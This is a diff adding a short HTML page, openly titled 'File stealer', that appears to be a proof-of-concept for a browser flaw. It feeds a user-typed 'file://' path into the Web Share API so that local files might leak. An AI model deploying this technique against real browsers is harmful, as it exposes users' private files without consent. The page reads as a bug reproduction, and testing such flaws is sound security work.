@@ -1,0 +1,15 @@
+<html>
+	<body>
+		File stealer
+		<p>
+			<input id="input"  type="text" placeholder="file path"/>
+		</p>
+		<button onclick='run();'>share file!</button>
+		<script>
+			function run() {
+				var opts = {url:  'file://' + document.getElementById("input").value};
+				navigator.share(opts);
+			}
+		</script>
+	</body>
+</html>
